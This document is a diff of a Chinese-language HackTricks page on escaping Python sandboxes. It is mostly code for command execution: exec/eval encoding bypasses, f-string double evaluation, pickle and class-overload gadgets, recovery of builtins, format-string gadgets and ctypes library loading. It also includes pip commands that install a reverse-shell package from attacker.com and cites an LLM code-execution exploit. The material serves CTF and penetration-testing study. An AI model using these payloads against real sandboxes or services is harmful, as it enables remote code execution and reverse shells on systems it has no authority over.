@@ -1,8 +1,8 @@
-# 绕过 Python 沙箱
+# 绕过 Python 沙盒
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-以下是一些绕过 Python 沙箱保护并执行任意命令的技巧。<sup>[[1]](#references)[[2]](#references)</sup>
+以下是一些绕过 Python 沙盒保护并执行任意命令的技巧。<sup>[[1]](#references)[[2]](#references)</sup>
 
 {{#ref}}
 js2py-sandbox-escape-cve-2024-28397.md
@@ -11,7 +11,7 @@ js2py-sandbox-escape-cve-2024-28397.md
 
 ## 命令执行库
 
-首先需要确认，是否可以使用某个已导入的库直接执行代码，或者是否可以导入以下任一库：
+首先需要确认是否可以使用已导入的库直接执行代码，或者是否可以导入以下任意库：
 
 ```python
 os.system("ls")
@@ -46,21 +46,21 @@ execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
 
-记住，_**open**_ 和 _**read**_ 函数可用于在 python sandbox 中**读取文件**，以及**编写代码**并**执行**它，从而**绕过** sandbox。
+记住，_**open**_ 和 _**read**_ 函数可用于在 python 沙箱中**读取文件**，并**编写一些代码**，以便你可以**执行**这些代码来**绕过**沙箱。
 
 > [!CAUTION] > **Python2 input()** 函数允许在程序崩溃前执行 python 代码。
 
-Python 会优先尝试从当前目录**加载库**（以下命令会打印 python 加载模块的位置）：`python3 -c 'import sys; print(sys.path)'`
+Python 会优先尝试从当前目录**加载库**（以下命令会打印 python 从哪里加载模块）：`python3 -c 'import sys; print(sys.path)'`
 
-![绕过 Python sandbox - 命令执行库：Python 会优先尝试从当前目录加载库（以下命令会打印 python 加载模块的位置……](<../../../images/image (559).png>)
+![绕过 Python 沙箱 - 命令执行库：Python 会优先尝试从当前目录加载库（以下命令会打印 python 从哪里加载模块……）](<../../../images/image (559).png>)
 
-## 使用默认安装的 python 包绕过 pickle sandbox
+## 使用默认安装的 python 包绕过 pickle 沙箱
 
 ### 默认包
 
-这里可以找到**预安装**包的[列表](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-注意，你可以通过 pickle 让 python 环境**导入**系统中安装的任意库。\
-例如，加载以下 pickle 时，它会导入 pip 库并使用它：
+你可以在此处找到**预装包列表**：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+注意，你可以通过 pickle 让 python 环境**导入系统中安装的任意库**。\
+例如，加载以下 pickle 时，它会导入 pip 库来使用：
 
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -75,34 +75,46 @@ class P(object):
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
 
-有关 pickle 工作原理的更多信息，请查看：[https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)。<sup>[[16]](#references)</sup>
+关于 pickle 工作原理的更多信息，请查看：[https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)。<sup>[[16]](#references)</sup>
 
-### Pip 包
+### Pip package
 
-由 **@isHaacK** 分享的技巧
+**@isHaacK** 分享的技巧
 
-如果你可以访问 `pip` 或 `pip.main()`，就可以安装任意包并通过调用以下内容获取 reverse shell：
+如果你可以访问 `pip` 或 `pip.main()`，就可以安装任意 package 并通过调用获取 reverse shell：
 
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 
-You can download the package to create the reverse shell here. Please note that before using it, you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
+你可以在这里下载用于创建 reverse shell 的 package。请注意，使用前应先**解压、修改 `setup.py`，并填入用于 reverse shell 的 IP**：
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
 > [!TIP]
-> This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell, the rest of the installation will fail, so you **won't leave any extra Python package installed on the server** when you leave.
+> 这个 package 名为 `Reverse`。不过，它经过特别设计，当你退出 reverse shell 时，后续安装过程会失败，因此你离开时**不会在服务器上留下任何额外安装的 Python package**。
+
+## Python 表达式求值探测
+
+当输入看起来会被当作 Python 表达式求值时，调用无害的 `str()` 有助于确认结果是否确实被执行，而不是原样反射回来。请根据 injection context 调整引号：<sup>[[19]](#references)</sup>
+
+```python
+"+str(True)+"  # If True is printed, the expression was evaluated.
+```
+
+不要仅凭这个探测就断定可以运行任意语句或操作系统命令；该 sink 可能只提供受限的表达式语言。
+
+相关的 Web 入口：[server-side template injection](../../../pentesting-web/ssti-server-side-template-injection/README.md) 和 [deserialization](../../../pentesting-web/deserialization/README.md)。
 
 ## Eval-ing Python 代码
 
 > [!WARNING]
-> Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
+> 注意，exec 允许多行字符串和 ";"，但 eval 不允许（检查 walrus operator）
 
-If certain characters are forbidden, you can use the **hex/octal/B64** representation to **bypass** the restriction:
+如果某些字符被禁止，可以使用 **hex/octal/B64** 表示法来 **绕过** 限制：
 
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
@@ -127,7 +139,7 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 
 ### F-string 二次求值 sink
 
-另一种非常常见的漏洞是**将攻击者可控的数据插入字符串，然后再将该字符串作为 f-string 求值**。这不是 Jinja/SSTI；在第二次求值时，Python 解释器会执行放在 `{...}` 中的任何内容：<sup>[[10]](#references)</sup>
+另一种非常常见的漏洞是**将攻击者控制的数据插入字符串，然后再将该字符串作为 f-string 求值**。这**不是** Jinja/SSTI；在第二次求值时，Python 解释器会执行放在 `{...}` 中的任何内容：<sup>[[10]](#references)</sup>
 
 ```python
 def template(first, last, gender):
@@ -145,26 +157,26 @@ eval(f"f'''{s}'''")
 # '5'
 ```
 
-因此，如果花括号、引号、点、下划线和圆括号都允许使用，像下面这样的 payload 通常可以实现 command execution：
+所以，如果大括号、引号、点、下划线和圆括号都被允许，像下面这样的 payload 通常可以实现命令执行：
 
 ```python
 {__import__("os").popen("id").read()}
 ```
 
-如果空格或 shell 元字符被过滤，请将命令用 Base64 编码，并在表达式中解码：
+如果空格或 shell 元字符被过滤，请将命令进行 Base64 编码，并在表达式内部解码：
 
 ```python
 {__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
 ```
 
-实用的排查模式：
+有用的搜寻模式：
 
 - `eval(f"f'''{user_input}'''")`
 - `eval(f'f"{user_input}"')`
 - 使用用户数据构建模板，然后对重建后的字符串调用 `eval`、`exec` 或 `compile` 的代码
-- 使用正则表达式校验字符，但仍允许 `{}` 和引号的 XML/JSON 处理器
+- 使用 regex 验证字符、但仍允许 `{}` 和引号的 XML/JSON 处理程序
 
-如果 sink 位于一个从 `request.data` 解析原始 XML/字节的 Flask endpoint 后面，请记住，`curl -d` 默认使用 `application/x-www-form-urlencoded`，这可能导致 `request.data` 为空。请改用**非表单**内容类型：
+如果 sink 位于一个从 `request.data` 解析原始 XML/字节的 Flask endpoint 后面，请记住，`curl -d` 默认使用 `application/x-www-form-urlencoded`，这可能导致 `request.data` 为空。请改用**非表单** content type：
 
 ```bash
 curl http://127.0.0.1:54321/addPatient \
@@ -189,9 +201,9 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
 
-也可以参阅 PDF 生成器中一个真实案例：沙箱化求值器逃逸：
+另请参阅 PDF 生成器中真实案例的沙箱 evaluator 逃逸：
 
-- ReportLab/xhtml2pdf 的三重方括号 [[[...]]] 表达式求值 → RCE (CVE-2023-33733)。它滥用 rl_safe_eval，从求值后的属性（例如字体颜色）访问 function.__globals__ 和 os.system，并返回有效值以保持渲染稳定。<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+- ReportLab/xhtml2pdf 的三重方括号 [[[...]]] 表达式求值 → RCE (CVE-2023-33733)。该漏洞滥用 rl_safe_eval，通过求值属性（例如字体颜色）访问 function.__globals__ 和 os.system，并返回有效值以确保渲染过程稳定。<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 {{#ref}}
 reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
@@ -210,11 +222,11 @@ reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 
 ## 将结构化模式匹配用作隐式属性读取
 
-在 Python 3.10+ 中，类模式会先检查 `isinstance(subject, Class)`。对于位置模式，Python 会通过 `Class.__match_args__` 映射位置，并在内部读取 subject 上对应的属性。<sup>[[18]](#references)</sup>
+在 Python 3.10+ 中，类模式会先检查 `isinstance(subject, Class)`。对于位置模式，Python 会通过 `Class.__match_args__` 映射位置，并在内部读取 subject 的这些属性。<sup>[[18]](#references)</sup>
 
-只拒绝 `ast.Attribute` 读取或 `getattr()` 调用的 AST 过滤器，可能会漏掉 `ast.MatchClass` 这条路径。这要求允许使用 `match/case`，且匹配的类可以修改其 `__match_args__`；如果被检查的对象由强制实施相同限制的代理包装，则这并不是一种绕过方式。<sup>[[17]](#references)</sup>
+如果 AST 过滤器只拒绝 `ast.Attribute` 读取或 `getattr()` 调用，就可能漏掉这条 `ast.MatchClass` 路径。这要求允许使用 `match/case`，且匹配的类的 `__match_args__` 可以被更改；如果被检查的对象由强制执行相同限制的代理封装，则这并不构成绕过。<sup>[[17]](#references)</sup>
 
-例如，即使暴露的内置项中没有 `__build_class__`，`namedtuple()` 也能提供可变的类。如果过滤器会拦截字面量 dunder 字符串，可以在运行时构造名称。以下模式无需通过提交的属性语法读取 `__reduce_ex__`；在报告的 sandbox 中，协议 4 会将真实的 Python 函数 `copyreg.__newobj__` 作为重建配方的第一个元素返回。<sup>[[17]](#references)</sup>
+例如，即使暴露的 builtins 中没有 `__build_class__`，`namedtuple()` 也能提供可变的类。如果字面量 dunder 字符串被过滤，可以在运行时构造名称。下面的模式无需通过提交的属性语法读取 `__reduce_ex__`；在报告中的 sandbox 里，协议 4 将真正的 Python 函数 `copyreg.__newobj__` 作为重建配方的第一个元素返回。<sup>[[17]](#references)</sup>
 
 ```python
 from collections import namedtuple
@@ -230,7 +242,7 @@ match Record(1):
 print(function)  # <function __newobj__ ...>
 ```
 
-第二个类模式需要匹配到那个真实函数，才能读取 `__globals__`。据报告，`_safe_type()` 替换项为 `type(lambda: None)` 返回了一个**可变的函数类型代理**，但该代理仍通过了函数实例检查。只有这种不安全的代理行为，才能让后续代码暴露原始的 `__builtins__` 字典及其 `__import__` 条目；真实的不可变函数类型无法以这种方式修改。后续的导入和命令执行原语请参见 [builtins recovery](#builtins)。<sup>[[17]](#references)</sup>
+第二种类模式必须先匹配那个真实函数，才能读取它的 `__globals__`。据报告，替换后的 `_safe_type()` 会为 `type(lambda: None)` 返回一个**可变的函数类型代理**，但它仍能通过函数实例检查。只有这种不安全的代理行为，才能让下面的后续操作暴露原始的 `__builtins__` 字典及其 `__import__` 条目；真正的不可变函数类型无法以这种方式修改。后续的导入和命令执行原语请参阅 [builtins 恢复](#builtins)。<sup>[[17]](#references)</sup>
 
 ```python
 FunctionProxy = type(lambda: None)  # vulnerable sandbox's replacement type()
@@ -243,7 +255,7 @@ match function:
 
 ## 通过编码绕过保护（UTF-7）
 
-在[**这篇 writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)中，UFT-7 被用于在表面上的 sandbox 中加载并执行任意 Python 代码：<sup>[[11]](#references)</sup>
+在[**这篇 writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)中，使用 UFT-7 在表面上的 sandbox 中加载并执行任意 Python 代码：<sup>[[11]](#references)</sup>
 
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
@@ -256,13 +268,13 @@ def f(x):
 """.lstrip()
 ```
 
-也可以使用其他编码绕过它，例如 `raw_unicode_escape` 和 `unicode_escape`。
+It 也可以通过其他编码方式绕过，例如 `raw_unicode_escape` 和 `unicode_escape`。
 
-## 不通过函数调用执行 Python
+## 不调用函数执行 Python
 
-如果你身处一个**不允许函数调用**的 Python jail 中，仍有一些方法可以**执行任意函数、代码**和**命令**。
+如果你身处一个**不允许调用函数**的 Python jail 中，仍有一些方法可以**执行任意函数、代码**和**命令**。
 
-### 使用 [装饰器](https://docs.python.org/3/glossary.html#term-decorator) 实现 RCE
+### 使用 [decorators](https://docs.python.org/3/glossary.html#term-decorator) 实现 RCE
 
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@@ -286,13 +298,13 @@ X = exec(X)
 class _:pass
 ```
 
-### RCE 创建对象和重载
+### 通过创建对象和重载实现 RCE
 
-如果你可以**声明一个类**并**创建该类的对象**，就可以**编写/覆盖不同的方法**，让它们在**无需直接调用**的情况下被**触发**。
+如果你可以**声明一个类**并**创建该类的对象**，就可以**编写/覆盖不同的方法**，使其在**无需直接调用**的情况下被**触发**。
 
 #### 使用自定义类实现 RCE
 
-你可以修改某些**类方法**（_通过覆盖现有类方法或创建一个新类_），使其在**被触发**时**执行任意代码**，而无需直接调用它们。
+你可以修改某些**类方法**（_通过覆盖现有类方法或创建新类_），使其在**被触发**时**执行任意代码**，而无需直接调用它们。
 
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
@@ -344,9 +356,9 @@ __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 
-#### 使用[元类](https://docs.python.org/3/reference/datamodel.html#metaclasses)创建对象
+#### 使用 [元类](https://docs.python.org/3/reference/datamodel.html#metaclasses)创建对象
 
-元类的关键作用是：**通过将目标类设为元类，创建一个新类，从而无需直接调用构造函数即可创建该类的实例**。<sup>[[15]](#references)</sup>
+元类的关键作用是：通过创建一个以目标类为元类的新类，**无需直接调用构造函数即可创建类的实例**。<sup>[[15]](#references)</sup>
 
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
@@ -365,7 +377,7 @@ Sub['import os; os.system("sh")']
 
 #### 使用异常创建对象
 
-当**触发异常**时，会**创建**一个 **Exception** 对象，无需直接调用构造函数（这是 [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez) 提供的技巧）：
+当**触发异常**时，无需直接调用构造函数，就会**创建**一个 **Exception** 对象（这是 [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez) 提供的技巧）：
 
 ```python
 class RCE(Exception):
@@ -411,7 +423,7 @@ __builtins__.__import__ = X
 {}[1337]
 ```
 
-### 使用 builtins help 和 license 读取文件
+### 使用内置 help 和 license 读取文件
 
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
@@ -424,10 +436,10 @@ with (a as b):
 
 ## 内置函数
 
-- [**Python 2 的内置函数**](https://docs.python.org/2/library/functions.html)
-- [**Python 3 的内置函数**](https://docs.python.org/3/library/functions.html)
+- [**python2 的内置函数**](https://docs.python.org/2/library/functions.html)
+- [**python3 的内置函数**](https://docs.python.org/3/library/functions.html)
 
-如果你可以访问 **`__builtins__`** 对象，就可以导入库（注意，你也可以使用上一节中展示的其他字符串表示形式）：
+如果你可以访问 **`__builtins__`** 对象，就可以导入库（注意，你也可以在这里使用上一节中展示的其他字符串表示形式）：
 
 ```python
 __builtins__.__import__("os").system("ls")
@@ -436,10 +448,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 
 ### 无内置函数
 
-当没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读写文件，因为**所有全局函数**（如 `open`、`import`、`print`……）**都未加载**。\
-不过，**默认情况下，python 会在内存中导入许多模块**。这些模块看似无害，但其中一些**也导入了危险功能**，可以利用这些功能实现**任意代码执行**。<sup>[[4]](#references)[[5]](#references)</sup>
+当你没有 `__builtins__` 时，就无法导入任何内容，甚至无法读写文件，因为**所有全局函数**（如 `open`、`import`、`print`……）**都没有加载**。\
+但是，**默认情况下，Python 会在内存中导入许多模块**。这些模块看起来可能无害，但其中一些模块**也会导入危险功能**，你可以利用这些功能获得**任意代码执行**能力。<sup>[[4]](#references)[[5]](#references)</sup>
 
-以下示例展示了如何**滥用**已加载的某些“**无害**”模块，以**访问**其中的**危险功能**。
+在以下示例中，你可以看到如何**滥用**已加载的某些“**无害**”模块，以**访问**其中的**危险功能**。
 
 **Python2**
 
@@ -487,7 +499,7 @@ get_flag.__globals__['__builtins__']
 
 [**下面有一个更大的函数**](#recursive-search-of-builtins-globals)，可以找到数十/**数百**个可以找到 **builtins** 的**位置**。
 
-#### Python2 and Python3
+#### Python2 和 Python3
 
 ```python
 # Recover __builtins__ and make everything easier
@@ -533,15 +545,15 @@ class_obj.__init__.__globals__
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
 
-[**下面还有一个更大的函数**](#recursive-search-of-builtins-globals)，可以找到几十/**上百**个能找到 **globals** 的**位置**。
+[**下面有一个更大的函数**](#recursive-search-of-builtins-globals)，可以找到数十/**数百**个能找到 **globals** 的**位置**。
 
 ## 发现任意执行
 
-这里我想说明如何轻松发现**加载的更多危险功能**，并提出更可靠的 exploit。
+这里我想说明如何轻松发现**已加载的更多危险功能**，并提出更可靠的 exploits。
 
-#### 使用绕过方法访问子类
+#### 使用 bypasses 访问子类
 
-这项技术中最敏感的部分之一，是能够**访问基类的子类**。在前面的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 实现的，但还有**其他可能的方法**：
+这项技术中最敏感的部分之一，是能够**访问基类的子类**。在前面的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 实现的，但还有**其他可能的方式**：
 
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
@@ -573,14 +585,14 @@ defined_func.__class__.__base__.__subclasses__()
 
 ### 查找已加载的危险库
 
-例如，知道通过库 **`sys`** 可以 **导入任意库**，你就可以搜索所有已加载且在内部导入了 sys 的模块：
+例如，知道通过 **`sys`** 库可以 **导入任意库**，你可以搜索所有**已加载且内部导入了 sys 的模块**：
 
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
 
-有很多种，**我们只需要一种**来执行命令：
+有很多，**我们只需要一个**来执行命令：
 
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
@@ -643,7 +655,7 @@ pdb:
 """
 ```
 
-此外，如果你认为**其他库**可能能够**调用函数执行命令**，也可以根据可能涉及的库中的函数名称进行过滤：
+此外，如果你认为**其他库**可能能够**调用函数来执行命令**，我们也可以按可能涉及的库中的函数名称进行筛选：
 
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
@@ -678,10 +690,10 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 """
 ```
 
-## 递归搜索内置对象、全局变量……
+## 递归搜索内置对象、全局变量...
 
 > [!WARNING]
-> 这简直**太棒了**。如果你**在寻找 globals、builtins、open 或任何其他对象**，只需使用这个脚本，**递归查找可以找到该对象的位置**。
+> 这简直**太棒了**。如果你在**寻找 globals、builtins、open 之类的对象**，只需使用此脚本**递归查找可以找到该对象的位置**。
 
 ```python
 import os, sys # Import these to find more gadgets
@@ -808,7 +820,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
 ## Python Format String
 
-如果你向 python **发送**一个即将被**格式化**的**字符串**，可以使用 `{}` 访问 **python 内部信息。**例如，你可以使用前面的示例访问 globals 或 builtins。<sup>[[14]](#references)</sup>
+如果你向 Python 发送一个将要被**格式化**的**字符串**，可以使用 `{}` 访问 **Python 内部信息。**例如，你可以使用前面的示例访问 globals 或 builtins。<sup>[[14]](#references)</sup>
 
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
@@ -830,11 +842,11 @@ st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
 
-注意，你可以像平常一样用**点号**访问**属性**，例如 `people_obj.__init__`；也可以不加引号，使用**括号**访问 **dict 元素**：`__globals__[CONFIG]`
+注意，你可以像平常一样用**点号**来**访问属性**，例如 `people_obj.__init__`；也可以不用引号、用**方括号**访问**字典元素**：`__globals__[CONFIG]`
 
-还要注意，你可以使用 `.__dict__` 枚举对象的元素：`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+另请注意，你可以使用 `.__dict__` 枚举对象的元素：`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-格式字符串还有一些其他有趣的特性：可以在指定对象上**执行** **`str`**、**`repr`** 和 **`ascii`** **函数**，分别添加 **`!s`**、**`!r`**、**`!a`** 即可：
+format strings 的另一个有趣特性是，可以通过分别添加 **`!s`**、**`!r`**、**`!a`**，对指定对象**执行** **`str`**、**`repr`** 和 **`ascii`** **函数**：
 
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
@@ -854,7 +866,7 @@ class HAL9000(object):
 #I'm afraid I can't do that.
 ```
 
-**更多**关于 **format** **string** 的示例可在 [**https://pyformat.info/**](https://pyformat.info) 中找到
+**更多**关于**格式** **字符串**的示例可在 [**https://pyformat.info/**](https://pyformat.info) 中找到
 
 > [!CAUTION]
 > 另请查看以下页面，了解可从 Python 内部对象中**读取敏感信息**的 gadgets：
@@ -886,18 +898,18 @@ str(x) # Out: clueless
 
 来自[这里](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)：`().class.base.subclasses()[108].load_module('os').system('dir')`。<sup>[[12]](#references)</sup>
 
-### 从 format 到 RCE：加载 libraries
+### 从 format 到 RCE：加载库
 
-根据这篇 writeup 中的 [**TypeMonkey 挑战**](https://corgi.rip/posts/buckeye-writeups/)，可以利用 python 中的 format string 漏洞从磁盘加载任意 libraries。<sup>[[13]](#references)</sup>
+根据[**这篇 writeup 中的 TypeMonkey 挑战**](https://corgi.rip/posts/buckeye-writeups/)，可以利用 Python 中的格式字符串漏洞从磁盘加载任意库。<sup>[[13]](#references)</sup>
 
-提醒一下，在 python 中每次执行某个操作时，都会调用一个函数。例如，`2*3` 会执行 **`(2).mul(3)`**，而 **`{'a':'b'}['a']`** 会执行 **`{'a':'b'}.__getitem__('a')`**。
+提醒一下，在 Python 中，每次执行某个操作时，都会调用某个函数。例如，`2*3` 会执行 **`(2).mul(3)`**，而 **`{'a':'b'}['a']`** 会执行 **`{'a':'b'}.__getitem__('a')`**。
 
-你可以在[**无需调用即可执行 Python**](#python-execution-without-calls)一节中找到更多类似内容。
+更多类似内容见[**不使用调用执行 Python**](#python-execution-without-calls)一节。
 
-python format string 漏洞不允许执行函数（它不允许使用圆括号），因此无法通过 `'{0.system("/bin/sh")}'.format(os)` 这样的方式实现 RCE。\
-不过，可以使用 `[]`。因此，如果某个常见的 python 库中有会执行任意代码的 **`__getitem__`** 或 **`__getattr__`** 方法，就可以利用它们实现 RCE。
+Python 格式字符串漏洞不允许执行函数（不允许使用括号），因此无法通过 `'{0.system("/bin/sh")}'.format(os)` 这样的方式实现 RCE。\
+不过，可以使用 `[]`。因此，如果某个常见的 Python 库有一个会执行任意代码的 **`__getitem__`** 或 **`__getattr__`** 方法，就可以利用它们实现 RCE。
 
-为了在 python 中寻找这样的 gadget，这篇 writeup 提供了这个 [**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)。作者找到了[这个](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463)：
+为了在 Python 中寻找这样的 gadget，这篇 writeup 提出了这个 [**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)。作者在其中找到了[这个](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463)：
 
 ```python
 class LibraryLoader(object):
@@ -921,20 +933,20 @@ cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
 
-这个 gadget 可以**从磁盘加载库**。因此，需要以某种方式将正确编译的库**写入或上传**到受攻击的服务器，以便加载。
+这个 gadget 可以从磁盘**加载库**。因此，需要以某种方式将**已正确编译的待加载库写入或上传到**被攻击的服务器。
 
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
 
-这个 challenge 实际上利用了服务器中的另一个漏洞，该漏洞允许在服务器磁盘上创建任意文件。
+这个挑战实际上利用了服务器中的另一个漏洞，该漏洞允许在服务器磁盘上创建任意文件。
 
-## Dissecting Python Objects
+## 剖析 Python 对象
 
 > [!TIP]
-> 如果你想深入**学习** **python bytecode**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> 如果你想深入**了解** **Python 字节码**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-在某些 CTF 中，你可能会获得一个**存放 flag 的自定义函数**的名称，需要查看该**函数**的**内部实现**来提取 flag。
+在一些 CTF 中，你可能会拿到一个**存有 flag 的自定义函数**的名称，并需要查看该**函数**的**内部实现**来提取 flag。
 
 要检查的函数如下：
 
@@ -960,7 +972,7 @@ dir(get_flag) #Get info tof the function
 
 #### globals
 
-`__globals__` 和 `func_globals`（相同）可获取全局环境。在示例中，你可以看到一些已导入的模块、一些全局变量及其声明的内容：
+`__globals__` and `func_globals`（相同）可获取全局环境。示例中可以看到一些已导入的模块、一些全局变量及其声明的内容：
 
 ```python
 get_flag.func_globals
@@ -971,7 +983,7 @@ get_flag.__globals__
 CustomClassObject.__class__.__init__.__globals__
 ```
 
